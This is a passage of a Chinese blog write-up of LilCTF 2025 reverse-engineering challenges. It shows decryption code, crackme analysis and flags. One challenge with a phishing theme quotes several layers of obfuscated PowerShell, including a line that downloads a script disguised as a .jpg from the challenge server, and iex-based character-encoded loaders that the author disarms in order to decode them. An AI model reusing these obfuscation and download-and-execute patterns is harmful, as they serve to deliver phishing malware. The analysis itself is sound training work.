+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;&lt;http://challenge.xinshi.fun:36057/bestudding.jpg&gt;&#x27;</span></span><br><span class="line"><span class="variable">$webClient</span> = <span class="built_in">New-Object</span> Net.WebClient</span><br><span class="line"><span class="variable">$scriptContent</span> = <span class="variable">$webClient</span>.DownloadString(<span class="variable">$url</span>)</span><br><span class="line"><span class="variable">$scriptContent</span></span><br><span class="line"><span class="comment">#这样就可以得到jpg的代码</span></span><br></pre></td></tr></table></figure></div>
+
+<p>第五层</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;(&#x27;</span>  | % &#123; <span class="variable">$r</span> = + <span class="variable">$</span>() &#125; &#123; <span class="variable">$u</span> = <span class="variable">$r</span> &#125; &#123; <span class="variable">$b</span> = ++  <span class="variable">$r</span> &#125; &#123; <span class="variable">$q</span> = </span><br><span class="line">(  <span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$z</span> = (  <span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$o</span> = (<span class="variable">$r</span></span><br><span class="line">= <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$d</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$h</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> +</span><br><span class="line"><span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$e</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$i</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) </span><br><span class="line">&#125; &#123; <span class="variable">$x</span> = (<span class="variable">$q</span> *( <span class="variable">$z</span>) ) &#125; &#123; <span class="variable">$l</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>) &#125; &#123; <span class="variable">$g</span> = <span class="string">&quot;[&quot;</span> </span><br><span class="line">+ <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)&quot;</span>[<span class="variable">$e</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$l</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;  )  </span></span><br><span class="line"><span class="string">&quot;</span>[  <span class="string">&quot;<span class="variable">$q</span><span class="variable">$u</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>?&quot;</span>[<span class="variable">$b</span>  ] + <span class="string">&quot;]&quot;</span> &#125; &#123; <span class="variable">$r</span> = <span class="string">&quot;&quot;</span>.(<span class="string">&quot;<span class="variable">$</span>(  @&#123;&#125;  )  </span></span><br><span class="line"><span class="string">&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$o</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;&#125;)  &quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$h</span>&quot;</span>] + <span class="string">&quot;<span class="variable">$</span>(  @&#123;  &#125;  )&quot;</span>[<span class="variable">$u</span>]</span><br><span class="line">+ <span class="string">&quot;<span class="variable">$</span>(@&#123;&#125;  )&quot;</span>[<span class="variable">$o</span>] + <span class="string">&quot;<span class="variable">$</span>?  &quot;</span>[  <span class="variable">$b</span>] + <span class="string">&quot;<span class="variable">$</span>(  @&#123;&#125;)&quot;</span>[<span class="variable">$z</span>  ]) &#125; &#123; <span class="variable">$r</span></span><br><span class="line">= <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;  )&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span>&quot;</span> + <span class="string">&quot;<span class="variable">$o</span>&quot;</span>] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)  &quot;</span>[<span class="variable">$o</span>  ] + <span class="string">&quot;<span class="variable">$r</span>&quot;</span></span><br><span class="line">[<span class="string">&quot;<span class="variable">$q</span>&quot;</span> + <span class="string">&quot;<span class="variable">$e</span>&quot;</span>  ] &#125; ); </span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"><span class="variable">$r</span> (<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span></span></span><br><span class="line"><span class="string">   <span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+</span></span><br><span class="line"><span class="string">   <span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">   q+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+</span></span><br><span class="line"><span class="string">   <span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">   u+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span></span></span><br><span class="line"><span class="string">   <span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span></span></span><br><span class="line"><span class="string">   <span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span>.......)  </span></span><br><span class="line"><span class="string">&quot;</span>  |  .<span class="variable">$r</span></span><br><span class="line"><span class="comment"># 将.$r替换为 Write-Output,让其继续自解密</span></span><br></pre></td></tr></table></figure></div>
+
+<p>第六层</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">iex</span>  ([<span class="built_in">CHar</span>]<span class="number">36</span>+[<span class="built_in">CHar</span>]<span class="number">68</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">98</span>+[<span class="built_in">CHar</span>]<span class="number">117</span>+[<span class="built_in">CHar</span>]<span class="number">10</span></span><br><span class="line"><span class="number">3</span>+[<span class="built_in">CHar</span>]<span class="number">80</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">102</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">114</span></span><br><span class="line">+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">61</span>+[</span><br><span class="line"><span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">36</span>+[<span class="built_in">CHar</span>]<span class="number">69</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">111</span>+[<span class="type">CHa</span></span><br><span class="line"><span class="type">r</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">65</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]<span class="number">116</span>+[<span class="built_in">CHar</span>]<span class="number">105</span>+[<span class="built_in">CHar</span>]<span class="number">111</span>+[<span class="built_in">CHar</span>]</span><br><span class="line"><span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">80</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">102</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">1</span></span><br><span class="line"><span class="number">14</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">61</span>+</span><br><span class="line">[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">36</span>+[<span class="built_in">CHar</span>]<span class="number">86</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">98</span>+[<span class="type">CHa</span></span><br><span class="line"><span class="type">r</span>]<span class="number">111</span>+[<span class="built_in">CHar</span>]<span class="number">115</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">80</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span></span><br><span class="line">]<span class="number">102</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]</span><br><span class="line"><span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">61</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">36</span>+[<span class="built_in">CHar</span>]<span class="number">87</span>+[<span class="built_in">CHar</span>]<span class="number">97</span>+[<span class="type">C</span></span><br><span class="line"><span class="type">Har</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">105</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">103</span>+[<span class="built_in">CHar</span>]<span class="number">80</span>+[<span class="type">CH</span></span><br><span class="line"><span class="type">ar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">102</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="type">CH</span></span><br><span class="line"><span class="type">ar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">61</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">3</span></span><br><span class="line"><span class="number">4</span>+[<span class="built_in">CHar</span>]<span class="number">83</span>+[<span class="built_in">CHar</span>]<span class="number">105</span>+[<span class="built_in">CHar</span>]<span class="number">108</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">116</span></span><br><span class="line">+[<span class="built_in">CHar</span>]<span class="number">108</span>+[<span class="built_in">CHar</span>]<span class="number">121</span>+[<span class="built_in">CHar</span>]<span class="number">67</span>+[<span class="built_in">CHar</span>]<span class="number">111</span>+.....)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里将iex指令去除，继续让其自己转换字符然后拼接</span></span><br></pre></td></tr></table></figure></div>
+
+<p>运行后得到的代码如图，其中便包含flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250822113045985.png"
+                      alt="image-20250822113045985"
+                ></p>
+<p>LILCTF{Be_VIG1L@NT_@6alnst_PH15hiNG}</p>
+<h2 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a>obfusheader.h</h2><p>一个混淆得比较狠的题，直接分析程序流行不通，题目提示可以追踪数据流</p>
+<p>运行程序尝试一番试出来flag的长度为40</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250822172815403.png"
+                      alt="image-20250822172815403"
+                ></p>
+<p>通过字符串定位到输入函数的位置</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250822172854587.png"
+                     
+                ></p>
+<p>可以得知我们的输入是存放在unk_14003A040的，根据题目提示我们无法正常追踪程序流，那我们就定位我们输入存放的位置，并追踪之后每次对其读写的时机，于是在这里下一个硬件读写断点，使其每次被读写时都能被断下来</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823150735057.png"
+                      alt="image-20250823150735057"
+                ></p>
+<p>第一处，计算输入长度</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823151024934.png"
+                      alt="image-20250823151024934"
+                ></p>
+<p>第二次将输入的每两个字节与随机数异或</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823153031399.png"
+                      alt="image-20250823153031399"
+                ></p>
+<p>断点下在srand的调用处，可以看到随机数种子为rcx存放的内容，0x48691412</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823154805924.png"
+                      alt="image-20250823154805924"
+                ></p>
+<p>第三处为</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823162949787.png"
+                      alt="image-20250823162949787"
+                ></p>
+<p>有七处相同类型的花指令逐一除去后得到反汇编如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823165422831.png"
+                      alt="image-20250823165422831"
+                ></p>
+<p>逻辑是先输入的高四位与低四位进行或运算，然后再每个字节取反运算</p>
+<p>最后一次在msvcrt.dll的memcpy函数，rax存放加密后的输入，[rcx+rdx]存放的是密文</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250823214441243.png"
+                      alt="image-20250823214441243"
+                ></p>
+<p>exp如下：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[] = &#123;<span class="number">0x5C</span>, <span class="number">0xAF</span>, <span class="number">0xB0</span>, <span class="number">0x1C</span>, <span class="number">0xFC</span>, <span class="number">0xEF</span>, <span class="number">0xC7</span>, <span class="number">0x8D</span>, <span class="number">0x01</span>, <span class="number">0xDD</span>, <span class="number">0x34</span>, <span class="number">0x39</span>, <span class="number">0x13</span>, <span class="number">0xBE</span>, <span class="number">0x47</span>, <span class="number">0x2D</span>, <span class="number">0x0E</span>, <span class="number">0x7C</span>, <span class="number">0xFF</span>, <span class="number">0xFA</span>, <span class="number">0x7D</span>, <span class="number">0x0F</span>, <span class="number">0xD0</span>, <span class="number">0xFA</span>, <span class="number">0xFA</span>, <span class="number">0x3D</span>, <span class="number">0x81</span>, <span class="number">0xFD</span>, <span class="number">0x73</span>, <span class="number">0xA8</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>, <span class="number">0x7B</span>, <span class="number">0x42</span>, <span class="number">0xEB</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xDF</span>, <span class="number">0x1B</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">40</span>];</span><br><span class="line">    srand(<span class="number">0x48691412</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cipher); i++)&#123;</span><br><span class="line">        flag[i] = ~cipher[i];</span><br><span class="line">        flag[i] = (flag[i] &lt;&lt; <span class="number">4</span>) | (flag[i] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cipher); i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>* temp = (<span class="type">unsigned</span> <span class="type">short</span> *) &amp;flag[i];</span><br><span class="line">        *temp ^= rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(flag); i++)&#123;</span><br><span class="line">        <span class="built_in">putchar</span>(flag[i]);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//LILCTF&#123;wHat_Is_DatA1LOW_CaN_1T_b3_E4TeN&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250824183425398.png"
+                      alt="image-20250824183425398"
+                ></p>
+<p>一道crackme，注册码即为flag，通过搜索字符串定位到最后的判断逻辑</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250824183857052.png"
+                      alt="image-20250824183857052"
+                ></p>
+<p>往上回溯到sub_40EE30函数，可以看到类似于密文的东西</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250824195732730.png"
+                      alt="image-20250824195732730"
+                ></p>
+<p>往下调发现加密函数在sub_40FFF0，是个简单的字符加减的解密</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250824221951657.png"
+                      alt="image-20250824221951657"
+                ></p>
+<p>ZNK9QLineEdit4textEv函数是用来获取QlineEdit输入框中的输入内容，因为这里是直接对密文加密的，因此我们无需去还原加密算法，这里该函数的第二个参数直接就是明文</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250824222153188.png"
+                      alt="image-20250824222153188"
+                ></p>
+<p>LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}</p>
+<h2 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a>Oh_My_Uboot</h2>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> LilCTF REwp+复现</li>
+        <li><strong>作者:</strong> w1n9</li>
+        <li><strong>创建于
+                :</strong> 2025-08-21 11:18:35</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-08-24 23:21:35
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://vv1n9.github.io/2025/08/21/LilCTF REwp+复现/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/RE/">#RE</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%AF%94%E8%B5%9BWP-%E5%A4%8D%E7%8E%B0/">#比赛WP/复现</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/01/NepCTF%20RE%E5%A4%8D%E7%8E%B0/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">NepCTF 部分REwp+复现</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">LilCTF REwp+复现</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ARM-ASM"><span class="nav-text">ARM_ASM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E2%80%99M-no7-A-rO6oT"><span class="nav-text">1’M no7 A rO6oT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#obfusheader-h"><span class="nav-text">obfusheader.h</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Qt-Creator"><span class="nav-text">Qt_Creator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oh-My-Uboot"><span class="nav-text">Oh_My_Uboot</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">w1n9</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 4 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
